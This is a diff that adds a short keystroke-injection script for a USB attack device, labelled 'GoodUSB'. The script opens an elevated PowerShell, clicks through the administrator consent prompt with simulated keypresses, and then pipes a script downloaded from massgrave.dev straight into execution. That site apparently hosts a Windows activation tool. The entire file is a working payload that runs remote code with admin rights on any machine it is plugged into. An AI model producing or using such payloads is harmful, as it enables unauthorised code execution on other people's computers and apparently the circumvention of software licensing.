@@ -1,0 +1,13 @@
+REM Category: GoodUSB
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1000
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING irm https://massgrave.dev/get | iex
+ENTER
